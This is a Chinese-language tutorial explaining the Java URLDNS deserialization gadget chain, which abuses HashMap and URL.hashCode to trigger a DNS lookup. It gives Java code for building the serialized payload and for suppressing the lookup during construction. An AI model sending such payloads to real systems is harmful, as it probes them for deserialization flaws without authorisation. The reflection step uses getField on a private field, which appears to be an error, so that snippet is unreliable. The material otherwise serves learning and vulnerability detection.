利用链分析 §

该利用链多用于验证反序列化漏洞的存在，通过它能够发起 DNS 请求。调用过程如下

Gadget Chain:
  HashMap.readObject()
    HashMap.putVal()
      HashMap.hash()
        URL.hashCode()

这个利用链的最终目的是调用能够发起 DNS 请求的方法。

这个方法为 URLStreamHandler#getHostAddress()，而 URL 类中有一个成员 handler 的类型就是 URLStreamHandler。那么如何让 URL 对象反序列化时调用它呢？这里再次利用了 HashMap 的特点，hashCode 方法。

URL 的 hashCode 方法如下

public synchronized int hashCode() {
    if (hashCode != -1)
        return hashCode;
 
    hashCode = handler.hashCode(this);
    return hashCode;
}

之后会调用 handler 的 hashCode 方法

protected int hashCode(URL u) {
    int h = 0;
 
    // Generate the protocol part.
    String protocol = u.getProtocol();
    if (protocol != null)
        h += protocol.hashCode();
 
    // Generate the host part.
    InetAddress addr = getHostAddress(u);
    if (addr != null) {
        h += addr.hashCode();
    } else {
        String host = u.getHost();
        if (host != null)
            h += host.toLowerCase().hashCode();
    }

到这里构造 payload 的方式就很简单，代码如下

HashMap ht = new HashMap();
URL u = new URL(url);
// value 并不重要，只要它能被反序列化就行
ht.put(u, "");
// 将u的hashCode设置为-1
Field f = u.getClass().getField("hashCode");
f.setAccessible(true);
f.set(u, -1);

但这种方式会在调用 put 方法的时候执行一次 hashCode，从而导致发起 DNS 请求。为了避免这种情况可以自己继承 URLStreamHandler

static class SilentURLStreamHandler extends URLStreamHandler {
 
    protected URLConnection openConnection(URL u) throws IOException {
            return null;
    }
 
    protected synchronized InetAddress getHostAddress(URL u) {
            return null;
    }
}

并将相关方法置空，这里不用担心反序列化时出现找不到 SilentURLStreamHandler 的问题，因为它 handler 是 transient 的。

然后使用 URL 的另一个构造函数即可。

URLStreamHandler handler = new SilentURLStreamHandler();
URL u = new URL(null, url, handler);
